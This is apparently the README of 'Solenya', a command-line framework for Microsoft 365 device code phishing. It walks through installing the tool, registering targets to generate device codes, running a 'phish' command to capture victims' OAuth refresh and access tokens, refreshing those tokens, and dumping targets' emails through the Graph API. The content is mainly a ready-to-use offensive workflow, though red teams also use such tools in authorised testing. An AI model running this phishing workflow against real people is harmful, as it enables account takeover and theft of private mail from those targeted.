<img src="https://img.shields.io/github/issues/CultCornholio/solenya">  <img src="https://img.shields.io/github/forks/CultCornholio/solenya">   <img src="https://img.shields.io/github/stars/CultCornholio/solenya">   <img src="https://img.shields.io/github/license/CultCornholio/solenya">

# Solenya - M365 Device Code Phishing Framework

<p align="center">
    <img src="/images/pickleRick.png">
</p>


Solenya is a cli tool which provides a framework to perform M365 device code phishing. As defined in RFC8628, an attacker can perform a social engineering attack by instructing a target to register a malicious application using a device code. 

## Creating Azure Application
By default, Microsoft allows any user to add new applications to their M365 profile. Below, is a screenshot of a fresh deployment of an Azure subscription.

![default_permissions](/images/default_permissions.png)

<p align="center">
    <img src="/images/implication-dennis.gif">
</p>

## Installation

**The package requires Python 3.7 or higher.**

Install latest version from PyPI: ```pip install solenya```

## Usage

### Creating a Workspace
The ```wsp``` command is responsible for initializing the WorkSpace. The tool leverages an SQLite database to store target information. To create a workspace run:
```
$ sol wsp <client_ID> -t <target_name>
```
### Managing Targets
The ```target``` command can add additional targets and remove or reset existing ones. The command will automatically reach out to Microsoft Online API and create a User Code and a Device Code, which will both be stored in the database. 
```
$ sol target <target_names>
```
The ```switch``` command switches between active targets in the WorkSpace.
```
$ sol switch <target_name>
```
### Gathering OAuth Access Tokens 
The ```auth``` command is responsible for authenticating targets registered with the WorkSpace. Run the ```phish``` sub command and wait for the your targets to enter the device code on their end.
```
$ sol auth phish --monitor --all
```
Once the Refresh and Access tokens are obtained they will be saved to the database. The Access token can be refreshed using the ```refresh command```.
```
$ sol auth refresh --all
```
### Dumping Data
Once the target is authenticated the ```dump``` command can be used to dump information from the Graph API.
```
$ sol dump emails --all
```
### Exporting Targets
The information in the database can be exported using the ```export``` command.
```
$ sol export --all
```
## Contact
- Contact us at cult.cornholio@gmail.com or open up a new Issue on GitHub.

## Acknowledgements
- [Optiv - Microsoft 365 OAuth Device Code Flow and Phishing](https://www.optiv.com/insights/source-zero/blog/microsoft-365-oauth-device-code-flow-and-phishing)
- [SecureWorks - OAuth’s Device Code Flow Abused in Phishing Attacks](https://www.secureworks.com/blog/oauths-device-code-flow-abused-in-phishing-attacks)
- [Jenko Hwong - New Phishing Attacks Exploiting OAuth Authorization Flows](https://www.netskope.com/blog/new-phishing-attacks-exploiting-oauth-authorization-flows-part-1)
- [Dirk-jan Mollema - ROADtools](https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/)
- [Office 365 Blog](https://o365blog.com/post/phishing/)
- [rvrsh3ll - TokenTactics](https://github.com/rvrsh3ll/TokenTactics)



